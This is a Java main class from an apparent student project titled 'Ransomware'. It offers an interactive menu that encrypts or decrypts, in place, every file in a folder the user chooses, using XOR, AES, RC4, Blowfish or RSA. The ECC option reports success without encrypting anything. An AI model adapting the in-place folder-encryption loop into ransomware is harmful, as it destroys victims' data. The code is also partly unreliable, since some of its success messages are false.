// Author: Rachel Tam
// EECS 3481 Group Project - Ransomware
// This is the main class, implements all the required functions

//package project;

import java.io.File;
import java.io.IOException;
import java.util.Scanner;

/*
    To run in command line (or terminal for mac users):
    Step 1: Open command line (or terminal)
    Step 2: Use "cd" command to go to the directory of this file
    Step 3: Type "javac Main.java" to compile program
    Step 4: Type "java Main.java" to run program
    Step 5: Type a command (or type "help" to see list of commands)
 */

public class Main {

	public static void main(String[] args) throws Exception {
		Scanner scanner = new Scanner(System.in);
		String algorithm = "temp";
		String key = "temp";
		File[] filesArray = null;
		String location = null;

		String prime1; // prime number to generate RSA key pair
		String prime2; // prime number to generate RSA key pair
		int[] pubKey = new int[2]; // public key for RSA encryption
		int[] privKey = new int[2]; // private key for RSA decryption

		Boolean run = true;
		Boolean fRun = false; // to check if the "folder" command has been run first
		Boolean tRun = false; // to check if the "type" command has been run first
		Boolean sRun = false; // to check if the "secrets" command has been run first

		while (run == true) {

			System.out.print("Please enter a command: ");
			String command = scanner.next();

			if (command.compareToIgnoreCase("folder") == 0) {
				System.out.print("Please enter location of file to use: ");
				location = scanner.next();

				/*
				 * Location has the file path to the folder we create an array of File objects
				 * and store all the files belong to the folder
				 */
				File Folder = new File(location);
				filesArray = Folder.listFiles();

				// Optional code that prints all the file paths of the files within the folder
				// variable
				for (File f : filesArray) {
					System.out.println(f);
				}

				fRun = true;
			} else if (command.compareToIgnoreCase("type") == 0) {
				System.out.print("Symmetric Algorithms: \nXOR \nAES \nRC4 \nBlowfish\n");
				System.out.print("Asymmetric Algorithms: \nRSA \nECC \n");
				System.out.print("Please enter which algorithm you would like to use: ");

				algorithm = scanner.next();

				if (sRun == true && algorithm.compareToIgnoreCase("rsa") == 0) {
					System.out.println("Please use the command \"secrets\" to choose your prime numbers for RSA.");
					sRun = false;
				}

				tRun = true;
			} else if (command.compareToIgnoreCase("secrets") == 0) {

				System.out.print("Please enter your chosen key: ");
				key = scanner.next();

				if (tRun == true && algorithm.equalsIgnoreCase("rsa")) {
					try {
						RSAProject.keyPairGenerator();
					} catch (Exception E) {
					}

					RSAProject.generateAESKeys(key, location); // generates the AES Secret key object and creates the
																// file AESKey.txt that stores the AES key.
				}

				sRun = true;
			} else if (command.compareToIgnoreCase("encrypt") == 0) {
				if (fRun == false || tRun == false || sRun == false) {
					System.out.println(
							"Please use the \"folder\", \"type\", and \"secrets\" command to select the folder to, "
									+ "encrypt/decrypt, your chosen key, and encryption/decryption algorithm before encrypting.");
				}
				// all encryption is performed file by file within the selected folder
				else {
					if (algorithm.compareToIgnoreCase("xor") == 0) {
						// linked to encryption of XOR code
						for (int i = 0; i < filesArray.length; i++) {
							File j = filesArray[i];
							xor12.encryptdecrypt(j, key);
						}

						System.out.println("Encryption complete.");
					}
					if (algorithm.compareToIgnoreCase("aes") == 0) {
						// linked to encryption of AES code
						for (int i = 0; i < filesArray.length; i++) {
							File j = filesArray[i];
							byte[] content = AESClass.readFile(j);
							AESClass.encrypt(content, key, j);
						}

						System.out.println("Encryption complete.");
					}
					if (algorithm.compareToIgnoreCase("rc4") == 0) {
						// link to encryption of RC4 code
						for (int i = 0; i < filesArray.length; i++) {
							File j = filesArray[i];
							// TODO call encryption method of RC4 here with file j and string key
							rc4Project.readFile(j);

							rc4Project.setKey(key);
							rc4Project.initializeStateANDKeyArray();
							rc4Project.keyScheduling();
							rc4Project.pseudoRandomStreamGeneration();
							rc4Project.encryptDecrypt(j);

						}

						System.out.println("Encryption complete.");
					}
					if (algorithm.compareToIgnoreCase("blowfish") == 0) {
						// linked to encryption of blowfish code

						for (int i = 0; i < filesArray.length; i++) {
							File j = filesArray[i];
							Bfish.encrypt(j, j, key);
						}

						System.out.println("Encryption complete.");
					}
					if (algorithm.compareToIgnoreCase("rsa") == 0) {
						// linked to encryption of RSA code
						// linked to decryption of RSA code

						for (int i = 0; i < filesArray.length; i++) {

							if (!filesArray[i].getPath().contains("AES")) {
								File j = filesArray[i];
								byte[] content = AESClass.readFile(j);
								RSAProject.encryptAES(content, RSAProject.secretKey, j);

							}

						}
						RSAProject.encrypt(location); // encrypt the AES key

						System.out.println("Encryption complete.");
					}
					if (algorithm.compareToIgnoreCase("ecc") == 0) {
						// linked to encryption of ECC code
						for (int i = 0; i < filesArray.length; i++) {
							File j = filesArray[i];
							// TODO call encryption method of ECC here with file j and string key
						}

						System.out.println("Encryption complete.");
					}
				}

			} else if (command.compareToIgnoreCase("decrypt") == 0) {
				if (fRun == false || tRun == false || sRun == false) {
					System.out.println(
							"Please use the \"folder\", \"type\", and \"secrets\" command to select the folder to, "
									+ "encrypt/decrypt, your chosen key, and encryption/decryption algorithm before decrypting.");
				}
				// all decryption is performed file by file within the selected folder
				else {
					if (algorithm.compareToIgnoreCase("xor") == 0) {
						// linked to XOR decryption code
						for (int i = 0; i < filesArray.length; i++) {
							File j = filesArray[i];
							xor12.encryptdecrypt(j, key);
						}

						System.out.println("Decryption complete.");
					}
					if (algorithm.compareToIgnoreCase("aes") == 0) {
						// linked to decryption of AES code
						for (int i = 0; i < filesArray.length; i++) {
							File j = filesArray[i];
							byte[] content = AESClass.readFile(j);
							AESClass.decrypt(content, key, j);
						}

						System.out.println("Decryption complete.");
					}
					if (algorithm.compareToIgnoreCase("rc4") == 0) {
						// linked to decryption of RC4 code
						for (int i = 0; i < filesArray.length; i++) {
							File j = filesArray[i];
							// TODO call encryption method of RC4 here with file j and string key
							rc4Project.readFile(j);
							rc4Project.setKey(key);
							rc4Project.initializeStateANDKeyArray();
							rc4Project.keyScheduling();
							rc4Project.pseudoRandomStreamGeneration();
							rc4Project.encryptDecrypt(j);

						}

						System.out.println("Decryption complete.");

					}
					if (algorithm.compareToIgnoreCase("blowfish") == 0) {
						// linked to decryption of blowfish code
						for (int i = 0; i < filesArray.length; i++) {
							File j = filesArray[i];
							Bfish.decrypt(j, j, key);
						}

						System.out.println("Decryption complete.");
					}
					if (algorithm.compareToIgnoreCase("rsa") == 0) {
						// linked to decryption of RSA code
						RSAProject.decrypt(location); // this first decrypts the aes key that is later used for
														// encrypting the files.

						for (int i = 0; i < filesArray.length; i++) {

							if (!filesArray[i].getPath().contains("AES")) {
								File j = filesArray[i];
								byte[] content = AESClass.readFile(j);
								RSAProject.decryptAES(content, RSAProject.secretKey, j);

							}

						}

						System.out.println("Decryption complete.");
					}
					if (algorithm.compareToIgnoreCase("ecc") == 0) {
						// linked to decryption of ECC code
						for (int i = 0; i < filesArray.length; i++) {
							File j = filesArray[i];
							// TODO call decryption method of ECC here with file j and string key
						}

						System.out.println("Decryption complete.");
					}
				}
			} else if (command.compareToIgnoreCase("help") == 0) {
				System.out.println("--folder: Select folder for encryption/decryption");
				System.out.println("--type: Select which algorithm to use to encrypt/decrypt");
				System.out.println("--secrets: Choose a key to encrypt/decrypt");
				System.out.println("--encrypt: Encrypt file/folder with your chosen algorithm and key");
				System.out.println("--decrypt: Decrypt file/folder with your chosen algorithm and key");
				System.out.println("--exit: Exit program");
			} else if (command.compareToIgnoreCase("exit") == 0) {
				scanner.close();
				System.out.println("Closing program...");
				run = false;
			} else {
				System.out.println("Command \"" + command + "\" not found. For more information on available commands, "
						+ "type \"help\".");
			}
		}
	}
}
